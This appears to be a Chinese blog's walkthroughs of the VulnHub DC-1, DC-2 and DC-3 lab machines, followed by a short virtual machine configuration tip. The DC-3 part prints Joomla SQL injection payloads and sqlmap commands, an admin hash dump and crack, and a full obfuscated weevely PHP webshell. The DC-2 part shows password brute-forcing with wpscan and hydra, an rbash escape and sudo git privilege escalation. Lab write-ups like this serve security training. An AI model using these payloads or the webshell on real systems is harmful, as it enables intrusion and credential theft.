<p><code>cat /usr/share/exploitdb/exploits/php/webapps/42033.txt</code></p>
<blockquote>
<p>#Exploit Title: Joomla 3.7.0 - Sql Injection</p>
<p>#Date: 05-19-2017</p>
<p>#Exploit Author: Mateus Lino</p>
<p>#Reference: <a href="https://blog.sucuri.net/2017/05/sql-injection-vulnerability-joomla-3-7.html">https://blog.sucuri.net/2017/05/sql-injection-vulnerability-joomla-3-7.html</a></p>
<p>#Vendor Homepage: <a href="https://www.joomla.org/">https://www.joomla.org/</a></p>
<p>#Version: = 3.7.0</p>
<p>#Tested on: Win, Kali Linux x64, Ubuntu, Manjaro and Arch Linux</p>
<p>#CVE : - CVE-2017-8917</p>
<p>URL Vulnerable: <a href="http://localhost/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list%5Bfullordering%5D=updatexml%27">http://localhost/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml%27</a></p>
<p>Using Sqlmap: </p>
<p>sqlmap -u “<a href="http://localhost/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list%5Bfullordering%5D=updatexml&quot;">http://localhost/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot;</a> –risk=3 –level=5 –random-agent –dbs -p list[fullordering]</p>
<p>Parameter: list[fullordering] (GET)<br>    Type: boolean-based blind<br>    Title: Boolean-based blind - Parameter replace (DUAL)<br>    Payload: option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=(CASE WHEN (1573=1573) THEN 1573 ELSE 1573*(SELECT 1573 FROM DUAL UNION SELECT 9674 FROM DUAL) END)</p>
<p>   Type: error-based<br>   Title: MySQL &gt;= 5.0 error-based - Parameter replace (FLOOR)<br>   Payload: option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=(SELECT 6600 FROM(SELECT COUNT(*),CONCAT(0x7171767071,(SELECT (ELT(6600=6600,1))),0x716a707671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)</p>
<p>   Type: AND/OR time-based blind<br>   Title: MySQL &gt;= 5.0.12 time-based blind - Parameter replace (substraction)<br>   Payload: option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=(SELECT * FROM (SEL</p>
</blockquote>
<br>

<p>给出了存在sql注入的url</p>
<p><code>http://localhost/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml%27</code></p>
<p>sqlmap注入命令</p>
<p><code>sqlmap -u &quot;http://localhost/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent --dbs -p list[fullordering]</code></p>
<p>存在的sql注入类型</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Type: boolean-based blind</span><br><span class="line">Title: Boolean-based blind - Parameter replace (DUAL)</span><br><span class="line">Payload: option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=(CASE WHEN (1573=1573) THEN 1573 ELSE 1573*(SELECT 1573 FROM DUAL UNION SELECT 9674 FROM DUAL) END) </span><br><span class="line">Type: error-based</span><br><span class="line">Title: MySQL &gt;= 5.0 error-based - Parameter replace (FLOOR)</span><br><span class="line">Payload: option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=(SELECT 6600 FROM(SELECT COUNT(),CONCAT(0x7171767071,(SELECT (ELT(6600=6600,1))),0x716a707671,FLOOR(RAND(0)2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)  </span><br><span class="line">Type: AND/OR time-based blind</span><br><span class="line">Title: MySQL &gt;= 5.0.12 time-based blind - Parameter replace (substraction)</span><br><span class="line">Payload: option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=(SELECT * FROM (SEL</span><br></pre></td></tr></table></figure>

<p>sqlmap -u “<a href="http://192.168.18.134/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list%5Bfullordering%5D=updatexml&quot;">http://192.168.18.134/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot;</a> –risk=3 –random-agent –batch –dbs -p list[fullordering]</p>
<p>得到数据库</p>
<blockquote>
<p>available databases [5]:<br>[*] information_schema<br>[*] joomladb<br>[*] mysql<br>[*] performance_schema<br>[*] sys</p>
</blockquote>
<p>查表名</p>
<p>sqlmap -u “<a href="http://192.168.18.134/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list%5Bfullordering%5D=updatexml&quot;">http://192.168.18.134/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot;</a> –risk=3 –random-agent –batch -D joomladb –tables -p list[fullordering]</p>
<blockquote>
<p>Database: joomladb<br>[76 tables]<br>+———————+<br>| #__assets           |<br>| #__associations     |<br>| #__banner_clients   |<br>| #__banner_tracks    |<br>| #__banners          |<br>| #__bsms_admin       |<br>| #__bsms_books       |<br>| #__bsms_comments    |<br>| #__bsms_locations   |<br>| #__bsms_mediafiles  |<br>| #__bsms_message_typ |<br>| #__bsms_podcast     |<br>| #__bsms_series      |<br>| #__bsms_servers     |<br>| #__bsms_studies     |<br>| #__bsms_studytopics |<br>| #__bsms_teachers    |<br>| #__bsms_templatecod |<br>| #__bsms_templates   |<br>| #__bsms_timeset     |<br>| #__bsms_topics      |<br>| #__bsms_update      |<br>| #__categories       |<br>| #__contact_details  |<br>| #__content_frontpag |<br>| #__content_rating   |<br>| #__content_types    |<br>| #__content          |<br>| #_<em>contentitem_tag</em> |<br>| #__core_log_searche |<br>| #__extensions       |<br>| #__fields_categorie |<br>| #__fields_groups    |<br>| #__fields_values    |<br>| #__fields           |<br>| #__finder_filters   |<br>| #__finder_links_ter |<br>| #__finder_links     |<br>| #_<em>finder_taxonomy</em> |<br>| #__finder_taxonomy  |<br>| #__finder_terms_com |<br>| #__finder_terms     |<br>| #__finder_tokens_ag |<br>| #__finder_tokens    |<br>| #__finder_types     |<br>| #__jbsbackup_timese |<br>| #__jbspodcast_times |<br>| #__languages        |<br>| #__menu_types       |<br>| #__menu             |<br>| #__messages_cfg     |<br>| #__messages         |<br>| #__modules_menu     |<br>| #__modules          |<br>| #__newsfeeds        |<br>| #__overrider        |<br>| #__postinstall_mess |<br>| #__redirect_links   |<br>| #__schemas          |<br>| #__session          |<br>| #__tags             |<br>| #__template_styles  |<br>| #__ucm_base         |<br>| #__ucm_content      |<br>| #__ucm_history      |<br>| #__update_sites_ext |<br>| #__update_sites     |<br>| #__updates          |<br>| #__user_keys        |<br>| #__user_notes       |<br>| #__user_profiles    |<br>| #__user_usergroup_m |<br>| #__usergroups       |<br>| #__users            |<br>| #__utf8_conversion  |<br>| #__viewlevels       |<br>+———————+</p>
</blockquote>
<p>查字段<br>sqlmap -u “<a href="http://192.168.18.134/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list%5Bfullordering%5D=updatexml&quot;">http://192.168.18.134/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot;</a> –risk=3 –random-agent -p list[fullordering] -D “joomladb” -T “#__users” –columns</p>
<blockquote>
<p>Database: joomladb<br>Table: #__users<br>[6 columns]<br>+———-+————-+<br>| Column   | Type        |<br>+———-+————-+<br>| email    | non-numeric |<br>| id       | numeric     |<br>| name     | non-numeric |<br>| params   | non-numeric |<br>| password | non-numeric |<br>| username | non-numeric |<br>+———-+————-+</p>
</blockquote>
<br>

<p>sqlmap -u “<a href="http://192.168.18.134/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list%5Bfullordering%5D=updatexml&quot;">http://192.168.18.134/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot;</a> –risk=3 –level=5 –random-agent -D joomladb -T “#__users” -C “username,password” –dump  -p list[fullordering]</p>
<blockquote>
<p>Database: joomladb<br>Table: #__users<br>[1 entry]<br>+———-+————————————————————–+<br>| username | password                                                     |<br>+———-+————————————————————–+<br>| admin    | $2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu |<br>+———-+————————————————————–+</p>
</blockquote>
<br>

<p>把密码存储起来使用John爆破</p>
<br>

<blockquote>
<p><code>vim dc3password_hash.txt</code></p>
<p>kali@kali2020:<del>/Tools$ cat dc3password_hash.txt<br>$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu<br>kali@kali2020:</del>/Tools$ sudo john dc3password_hash.txt -show<br>?:snoopy</p>
</blockquote>
<p>得到密码为snoopy</p>
<p>去登录后台(admin,snoopy),成功登录</p>
<p>寻找可以上传shell的位置</p>
<p>使用kali上自带的weevely（一款webshell管理工具）</p>
<blockquote>
<p>kali@kali2020:~$ weevely generate pass shell.php</p>
<p>Generated ‘shell.php’ with password ‘pass’ of 761 byte size.</p>
<p>kali@kali2020:~$ cat shell.php<br><?php
$Q='unction0/ x($t,$k){0/$0/c=strlen($k)0/;$0/l=strlen($0/t0/0/);$o="";f0/or($i=0;0/$i<$l;){for(0/$j0/0/';
$O='"0//$kh(.+)$0/kf/0/",@fi0/le_get_co0/0/ntents("php://0/i0/nput")0/,$m)==1) {0/@ob_st0/art();@e0/va';
$w='_e0/nd_cle0/an();$r=@base0/0/64_encode(@x(0/0/@gzc0/o0/m0/press($o),$k));pr0/int(0/"$p$kh$r$kf");}';
$o='$k="1a1dc0/91c";0/$k0/h="907320/5c0/69271";$k0/f="ddf0c940/4bc0/72";0/$p="Dw8BNaV0/0/He7JVExH0/0/0";f';
$Z=str_replace('iC','','criCeiCaiCteiC_funciCtiCion');
$A='=0;0/($j<$c&0/&0/$i0/<$l);$j0/++,$i++){$0/o.=$t{$i}^$k{$j};}}ret0/urn $0/o;}i0/f (@preg_0/match0/(';
$i='l0/(@gzun0/compress(0/@x(@0/base60/4_deco0/de($m[1])0/,$k)))0/;0/$o=@o0/b_get_conte0/nts();@0/o0/b';
$X=str_replace('0/','',$o.$Q.$A.$O.$i.$w);
$R=$Z('',$X);$R();
?></p>
</blockquote>
<p>将shell.php上传后进行连接</p>
<blockquote>
<p>kali@kali2020:~$ weevely <a href="http://192.168.18.134/templates/beez3/shell.php">http://192.168.18.134/templates/beez3/shell.php</a> pass</p>
<p>[+] weevely 4.0.1</p>
<p>[+] Target:     192.168.18.134<br>[+] Session:    /home/kali/.weevely/sessions/192.168.18.134/shell_1.session</p>
<p>[+] Browse the filesystem or execute commands starts the connection<br>[+] to the target. Type :help for more information.</p>
<p>weevely&gt; shell<br>sh: 1: shell: not found<br>www-data@DC-3:/var/www/html/templates/beez3 $ whoami<br>www-data<br>www-data@DC-3:/var/www/html/templates/beez3 $ </p>
<br>
</blockquote>
<p>想办法提权</p>
<p>查看靶机版本，发现为ubunutu16.04 内核版本为4.4.0-21</p>
<blockquote>
<p>www-data@DC-3:/var/www/html $ uname -a<br>Linux DC-3 4.4.0-21-generic #37-Ubuntu SMP Mon Apr 18 18:34:49 UTC 2016 i686 i686 i686 GNU/Linux<br>www-data@DC-3:/var/www/html $  lsb_release -a<br>No LSB modules are available.<br>Distributor ID: Ubuntu<br>Description:    Ubuntu 16.04 LTS<br>Release:        16.04<br>Codename:       xenial</p>
</blockquote>
<p>去漏洞库找下</p>
<blockquote>
<p>kali@kali2020:~/Tools$ searchsploit -w ubuntu 16.04 4.4.0-21</p>
<hr>
<p> Exploit Title                                                                |  URL</p>
<hr>
<p>Linux Kernel 4.10.5 / &lt; 4.14.3 (Ubuntu) - DCCP Socket Use-After-Free          | <a href="https://www.exploit-db.com/exploits/43234">https://www.exploit-db.com/exploits/43234</a><br>Linux Kernel 4.4.0-21 (Ubuntu 16.04 x64) - Netfilter ‘target_offset’ Out-of-B | <a href="https://www.exploit-db.com/exploits/40049">https://www.exploit-db.com/exploits/40049</a><br>Linux Kernel 4.4.0-21 &lt; 4.4.0-51 (Ubuntu 14.04/16.04 x64) - ‘AF_PACKET’ Race  | <a href="https://www.exploit-db.com/exploits/47170">https://www.exploit-db.com/exploits/47170</a><br>Linux Kernel &lt; 4.13.9 (Ubuntu 16.04 / Fedora 27) - Local Privilege Escalation | <a href="https://www.exploit-db.com/exploits/45010">https://www.exploit-db.com/exploits/45010</a><br>Linux Kernel &lt; 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Escalation        | <a href="https://www.exploit-db.com/exploits/44298">https://www.exploit-db.com/exploits/44298</a><br>Linux Kernel &lt; 4.4.0-21 (Ubuntu 16.04 x64) - ‘netfilter target_offset’ Local  | <a href="https://www.exploit-db.com/exploits/44300">https://www.exploit-db.com/exploits/44300</a><br>Linux Kernel &lt; 4.4.0-83 / &lt; 4.8.0-58 (Ubuntu 14.04/16.04) - Local Privilege E | <a href="https://www.exploit-db.com/exploits/43418">https://www.exploit-db.com/exploits/43418</a><br>Linux Kernel &lt; 4.4.0/ &lt; 4.8.0 (Ubuntu 14.04/16.04 / Linux Mint 17/18 / Zorin) | <a href="https://www.exploit-db.com/exploits/47169">https://www.exploit-db.com/exploits/47169</a><br>Ubuntu &lt; 15.10 - PT Chown Arbitrary PTs Access Via User Namespace Privilege E | <a href="https://www.exploit-db.com/exploits/41760">https://www.exploit-db.com/exploits/41760</a></p>
<hr>
<p>Shellcodes: No Results</p>
</blockquote>
<br>

<br>

<blockquote>
<p>www-data@DC-3:/var/www $ wget  <a href="https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip">https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip</a><br>–2021-05-01 23:52:54–  <a href="https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip">https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip</a><br>Resolving github.com (github.com)… 13.250.177.223<br>Connecting to github.com (github.com)|13.250.177.223|:443… connected.<br>HTTP request sent, awaiting response… 302 Found<br>Location: <a href="https://raw.githubusercontent.com/offensive-security/exploitdb-bin-sploits/master/bin-sploits/39772.zip">https://raw.githubusercontent.com/offensive-security/exploitdb-bin-sploits/master/bin-sploits/39772.zip</a> [following]<br>–2021-05-01 23:52:55–  <a href="https://raw.githubusercontent.com/offensive-security/exploitdb-bin-sploits/master/bin-sploits/39772.zip">https://raw.githubusercontent.com/offensive-security/exploitdb-bin-sploits/master/bin-sploits/39772.zip</a><br>Resolving raw.githubusercontent.com (raw.githubusercontent.com)… ::1, 127.0.0.1<br>Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|::1|:443… failed: Connection refused.<br>Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|127.0.0.1|:443… failed: Connection refused.<br>www-data@DC-3:/var/www $ ls<br>html<br>www-data@DC-3:/var/www $ wget  <a href="https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip">https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip</a></p>
<p>–2021-05-01 23:53:39–  <a href="https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip">https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip</a><br>Resolving github.com (github.com)… 13.250.177.223<br>Connecting to github.com (github.com)|13.250.177.223|:443… connected.<br>HTTP request sent, awaiting response… No data received.<br>Retrying.</p>
<p>–2021-05-01 23:53:56–  (try: 2)  <a href="https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip">https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip</a><br>Connecting to github.com (github.com)|13.250.177.223|:443… failed: Connection refused.<br>Resolving github.com (github.com)… 13.229.188.59<br>Connecting to github.com (github.com)|13.229.188.59|:443… connected.<br>HTTP request sent, awaiting response… 302 Found<br>Location: <a href="https://raw.githubusercontent.com/offensive-security/exploitdb-bin-sploits/master/bin-sploits/39772.zip">https://raw.githubusercontent.com/offensive-security/exploitdb-bin-sploits/master/bin-sploits/39772.zip</a> [following]<br>–2021-05-01 23:54:18–  <a href="https://raw.githubusercontent.com/offensive-security/exploitdb-bin-sploits/master/bin-sploits/39772.zip">https://raw.githubusercontent.com/offensive-security/exploitdb-bin-sploits/master/bin-sploits/39772.zip</a><br>Resolving raw.githubusercontent.com (raw.githubusercontent.com)… ::1, 127.0.0.1<br>Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|::1|:443… failed: Connection refused.<br>Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|127.0.0.1|:443… failed: Connection refused.</p>
</blockquote>
<p>下载超时，尝试在kali先下载在让靶机在kiali上下载,最近VM虚拟机代理不管用了还在排查…</p>
<br>

<br>

<br>

<br>

<br>

<br>

<p>总结</p>
<ul>
<li><p>namp扫网段和靶机开放端口</p>
</li>
<li><p>dirsearch扫描目录</p>
</li>
<li><p>信息搜集(Joomal)</p>
</li>
<li><p>Joomscan扫描版本</p>
</li>
<li><p>searchsploit 查找joomal漏洞</p>
</li>
<li><p>sqlmap跑后台账号密码(密码被hash)</p>
</li>
<li><p>john破解hash密码</p>
</li>
<li><p>登录后台，找上传shell的地方</p>
</li>
<li><p>使用weevely生产一句话<code>weevely generate &lt;password&gt; b.php</code></p>
</li>
<li><p>使用weevely连接<code>weevely &lt;URL&gt; &lt;password&gt;</code></p>
</li>
</ul>
<p><em>weevely使用(webshell) <code>https://blog.csdn.net/qq_26090065/article/details/81235120</code></em></p>
<ul>
<li>提权(未完成)</li>
</ul>
]]></content>
      <categories>
        <category>DCchallenges</category>
      </categories>
      <tags>
        <tag>DCchallenges</tag>
      </tags>
  </entry>
  <entry>
    <title>设备磁盘/CD-ROM配置不正确</title>
    <url>/posts/f1a8aa3a/</url>
    <content><![CDATA[<p>IDE 设备 (磁盘/CD-ROM)配置不正确。“ide0:1”上具有一个 IDE 从设备，但没有主设备。此配置在虚拟机中无法正常运行。请使用配置编辑器将磁盘/CD-ROM 从“ide0:1”移到“ide0:0”。<br>解决方案:<br>虚拟机设置-&gt;CD/DVD(IDE)-&gt;高级-&gt;IDE-&gt;设置为’IDE 0:0  CD/DVD(IDE)’</p>
]]></content>
      <categories>
        <category>VM</category>
      </categories>
      <tags>
        <tag>VM</tag>
      </tags>
  </entry>
  <entry>
    <title>DCchallenges2</title>
    <url>/posts/e4e28081/</url>
    <content><![CDATA[<p>靶机DC-2下载地址：<a href="https://download.vulnhub.com/dc/DC-2.zip">https://download.vulnhub.com/dc/DC-2.zip</a></p>
<br>

<p>环境</p>
<blockquote>
<p>网段 192.168.18.0/24</p>
<p>kali 192.168.18.131</p>
<p>靶机 192.168.18.132</p>
</blockquote>
<p>扫描网段</p>
<blockquote>
<p>sudo nmap -sn 192.168.18.0/24</p>
<p>Starting Nmap 7.91 ( <a href="https://nmap.org/">https://nmap.org</a> ) at 2021-04-30 10:12 CST<br>Nmap scan report for 192.168.18.2<br>Host is up (0.00013s latency).<br>MAC Address: 00:50:56:E0:DA:9A (VMware)<br>Nmap scan report for 192.168.18.132<br>Host is up (0.00055s latency).<br>MAC Address: 00:0C:29:4B:26:E6 (VMware)<br>Nmap scan report for 192.168.18.254<br>Host is up (0.00017s latency).<br>MAC Address: 00:50:56:E1:37:77 (VMware)<br>Nmap scan report for 192.168.18.131<br>Host is up.<br>Nmap done: 256 IP addresses (4 hosts up) scanned in 2.24 seconds<br>kali@kali2020:~$ </p>
</blockquote>
<p>扫描靶机开放的端口</p>
<blockquote>
<p>sudo nmap 192.168.18.132 -p- -sV<br>Starting Nmap 7.91 ( <a href="https://nmap.org/">https://nmap.org</a> ) at 2021-04-30 11:38 CST<br>Nmap scan report for dc-2 (192.168.18.132)<br>Host is up (0.0013s latency).<br>Not shown: 65533 closed ports<br>PORT     STATE SERVICE VERSION<br>80/tcp   open  http    Apache httpd 2.4.10 ((Debian))<br>7744/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u7 (protocol 2.0)<br>MAC Address: 00:0C:29:4B:26:E6 (VMware)<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</p>
</blockquote>
<p>开放了80端口和ssh端口，浏览器去访问发现无法访问，直接跳转成了dc2，去修改hosts</p>
<blockquote>
<p>sudo vim /etc/hosts</p>
<p>添加 192.168.18.132 dc-2</p>
</blockquote>
<p>再去访问192.168.18.132即可,发现是wordpress</p>
<h4 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h4><p>点击flag 得到flag1，提示使用<code>cewl</code></p>
<p><img src="/posts/e4e28081/flag1.png"></p>
<p>用<code>dirb</code>扫一下目录</p>
<p>扫到一个wp-admin 去访问后会跳转到登录页面 <a href="http://dc-2/wp-login.php">http://dc-2/wp-login.php</a></p>
<p>这里也可以用<code>nikto</code></p>
<p><img src="/posts/e4e28081/nikto1.png"></p>
<h4 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h4><p>使用kali自带的wpscan扫一下<br><code>wpscan --url dc-2 -e u</code></p>
<p><img src="/posts/e4e28081/wpscan1.png"></p>
<br>

<p>扫到三个用户名，admin,jerry,tom<br>创建一个list存放这三个用户名</p>
<br>

<p>根据flag1的提示 使用<code>cewl</code>生成密码字典</p>
<br>

<blockquote>
<p>kali@kali2020:~/Desktop$ cewl dc-2 -w dc-2.dic<br>CeWL 5.4.8 (Inclusion) Robin Wood (<a href="mailto:&#x72;&#111;&#98;&#x69;&#110;&#64;&#x64;&#105;&#x67;&#x69;&#x2e;&#110;&#x69;&#x6e;&#106;&#97;">&#x72;&#111;&#98;&#x69;&#110;&#64;&#x64;&#105;&#x67;&#x69;&#x2e;&#110;&#x69;&#x6e;&#106;&#97;</a>) (<a href="https://digi.ninja/">https://digi.ninja/</a>)</p>
<p>kali@kali2020:~/Desktop$ cat dc-2.dic </p>
</blockquote>
<p>使用wpscan爆破</p>
<blockquote>
<p>kali@kali2020:~/Desktop$ wpscan –url dc-2 -U dc-2users.list  -P dc-2.dic </p>
<p>[!] Valid Combinations Found:<br> | Username: jerry, Password: adipiscing<br> | Username: tom, Password: parturient</p>
</blockquote>
<p><img src="/posts/e4e28081/wpscan2.png"></p>
<p>使用tom 成功登录，发现有篇名为hello-word的文章进去看看</p>
<p>有一个搜索功能，尝试一下，发现输入1会出现flag1,输入2出现flag2<br><img src="/posts/e4e28081/flag2.png"><br><img src="/posts/e4e28081/flag12.png"><br>flag2提示换一条路，也是就说让我们去尝试ssh端口</p>
<p>使用hydra爆破ssh</p>
<blockquote>
<p>kali@kali2020:~/Desktop$ hydra -L dc-2users.list  -P dc-2.dic  192.168.18.132 ssh -s 7744</p>
<p> 得到账号密码</p>
<p>[7744][ssh] host: 192.168.18.132   login: tom   password: parturient</p>
</blockquote>
<h4 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h4><p>使用ssh登录<br><code>kali@kali2020:~/Desktop$ ssh tom@192.168.18.132 -p 7744</code><br>登录后<code>ls</code>后发现存在flag3.txt</p>
<p>使用<code>cat flag3.txt</code></p>
<blockquote>
<p>-rbash: sudo: command not found</p>
</blockquote>
<p><img src="/posts/e4e28081/rbashnotfound.png"></p>
<p><strong>-rbash绕过</strong><br>解决方案 <a href="https://www.cnblogs.com/xiaoxiaoleo/p/8450379.html">https://www.cnblogs.com/xiaoxiaoleo/p/8450379.html</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">BASH_CMDS[a]=/bin/sh;a </span><br><span class="line">export PATH=$PATH:/bin/</span><br><span class="line">export PATH=$PATH:/usr/bin</span><br></pre></td></tr></table></figure>
<p><img src="/posts/e4e28081/flag3.png"></p>
<p>得到flag3</p>
<h4 id="flag4"><a href="#flag4" class="headerlink" title="flag4"></a>flag4</h4><p>根据flag3提示，使用<code>su</code>切换到jerry用户下<br><code>cat /etc/passwd </code>发现Jerry用户<br>输入之前爆破出来的密码成功登录Jerry用户</p>
<blockquote>
<p>cd ~<br>ls<br>cat flag4.txt<br>Good to see that you’ve made it this far - but you’re not home yet.<br>You still need to get the final flag (the only flag that really counts!!!).<br>No hints here - you’re on your own now.  :-)<br>Go on - git outta here!!!!<br><br><br><br></p>
</blockquote>
<h4 id="flag5"><a href="#flag5" class="headerlink" title="flag5"></a>flag5</h4><p>查看sudo 支持的免密命令</p>
<blockquote>
<p>sudo -l</p>
<p>Matching Defaults entries for jerry on DC-2:<br>    env_reset, mail_badpass,<br>    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</p>
<p>User jerry may run the following commands on DC-2:<br>    (root) NOPASSWD: /usr/bin/git</p>
</blockquote>
<p>根据上一个提示 这里的git命令推测可以使用</p>
<p>考虑git提权 <a href="https://gtfobins.github.io/gtfobins/git/">https://gtfobins.github.io/gtfobins/git/</a></p>
<blockquote>
<p>sudo git -p –help</p>
</blockquote>
<p><img src="/posts/e4e28081/git1.png"><br><img src="/posts/e4e28081/git2.png"><br><img src="/posts/e4e28081/git3.png"><br><img src="/posts/e4e28081/finalflag.png"></p>
<p><strong>总结</strong></p>
<ul>
<li> rbash绕过</li>
<li> git提权</li>
</ul>
]]></content>
      <categories>
        <category>DCchallenges</category>
      </categories>
      <tags>
        <tag>DCchallenges</tag>
      </tags>
  </entry>
  <entry>
    <title>DCchallenges1</title>
    <url>/posts/7debd13b/</url>
    <content><![CDATA[<p>安装</p>
<p>下载解压后使用Vmware打开ova文件，选择桥接模式，同时也将kali设置为桥接模式</p>
<br>

<p>环境</p>
<blockquote>
<p>网段 192.168.18.0/24</p>
<p>kali 192.168.18.131</p>
<p>靶机 192.168.18.130</p>
</blockquote>
<br>

<p>扫描网段</p>
<blockquote>
<p><strong>sudo nmap -sn 192.168.18.0/24</strong></p>
<p>Starting Nmap 7.91 ( <a href="https://nmap.org/">https://nmap.org</a> ) at 2021-04-27 21:30 CST<br>Nmap scan report for 192.168.18.2<br>Host is up (0.00015s latency).<br>MAC Address: 00:50:56:E0:DA:9A (VMware)<br>Nmap scan report for 192.168.18.130<br>Host is up (0.00018s latency).<br>MAC Address: 00:0C:29:F4:40:B8 (VMware)<br>Nmap scan report for 192.168.18.254<br>Host is up (0.00036s latency).<br>MAC Address: 00:50:56:F1:CD:81 (VMware)<br>Nmap scan report for 192.168.18.131<br>Host is up.<br>Nmap done: 256 IP addresses (4 hosts up) scanned in 2.16 seconds</p>
</blockquote>
<br>

<p>扫描靶机开放的端口</p>
<blockquote>
<p><strong>sudo nmap -sS 192.168.18.130</strong></p>
<p>Starting Nmap 7.91 ( <a href="https://nmap.org/">https://nmap.org</a> ) at 2021-04-27 21:31 CST<br>Nmap scan report for 192.168.18.130<br>Host is up (0.000079s latency).<br>Not shown: 997 closed ports<br>PORT    STATE SERVICE<br>22/tcp  open  ssh<br>80/tcp  open  http<br>111/tcp open  rpcbind<br>MAC Address: 00:0C:29:F4:40:B8 (VMware)</p>
<p>Nmap done: 1 IP address (1 host up) scanned in 0.24 seconds</p>
<p>注：sS ：半开放扫描（非3次握手的tcp扫描）比较安全，不会产生会话，几乎不会产生日志，工作中常用，建议大家不要直接全上的去扫，稳妥更稳妥，需要有root权限</p>
</blockquote>
<p>发现开放了80端口，就用浏览器去访问一下<code>192.168.18.130:80</code> 根据网站页面显示信息可以判断是Drupal的CMS</p>
<p>用dirsearch扫一下看看有什么</p>
<blockquote>
<p><strong>python3 dirsearch.py -u 192.168.18.130:80</strong></p>
</blockquote>
<p>用dirb 扫一下试试</p>
<blockquote>
<p><strong>dirb <a href="http://192.168.18.130/">http://192.168.18.130</a></strong></p>
</blockquote>
<p>没找到啥有用的信息，看下robots.txt</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Crawl-delay: 10</span><br><span class="line"># Directories</span><br><span class="line">Disallow: /includes/</span><br><span class="line">Disallow: /misc/</span><br><span class="line">Disallow: /modules/</span><br><span class="line">Disallow: /profiles/</span><br><span class="line">Disallow: /scripts/</span><br><span class="line">Disallow: /themes/</span><br><span class="line"># Files</span><br><span class="line">Disallow: /CHANGELOG.txt</span><br><span class="line">Disallow: /cron.php</span><br><span class="line">Disallow: /INSTALL.mysql.txt</span><br><span class="line">Disallow: /INSTALL.pgsql.txt</span><br><span class="line">Disallow: /INSTALL.sqlite.txt</span><br><span class="line">Disallow: /install.php</span><br><span class="line">Disallow: /INSTALL.txt</span><br><span class="line">Disallow: /LICENSE.txt</span><br><span class="line">Disallow: /MAINTAINERS.txt</span><br><span class="line">Disallow: /update.php</span><br><span class="line">Disallow: /UPGRADE.txt</span><br><span class="line">Disallow: /xmlrpc.php</span><br><span class="line"># Paths (clean URLs)</span><br><span class="line">Disallow: /admin/</span><br><span class="line">Disallow: /comment/reply/</span><br><span class="line">Disallow: /filter/tips/</span><br><span class="line">Disallow: /node/add/</span><br><span class="line">Disallow: /search/</span><br><span class="line">Disallow: /user/register/</span><br><span class="line">Disallow: /user/password/</span><br><span class="line">Disallow: /user/login/</span><br><span class="line">Disallow: /user/logout/</span><br><span class="line"># Paths (no clean URLs)</span><br><span class="line">Disallow: /?q=admin/</span><br><span class="line">Disallow: /?q=comment/reply/</span><br><span class="line">Disallow: /?q=filter/tips/</span><br><span class="line">Disallow: /?q=node/add/</span><br><span class="line">Disallow: /?q=search/</span><br><span class="line">Disallow: /?q=user/password/</span><br><span class="line">Disallow: /?q=user/register/</span><br><span class="line">Disallow: /?q=user/login/</span><br><span class="line">Disallow: /?q=user/logout/</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>没什么有用的信息</p>
<br>

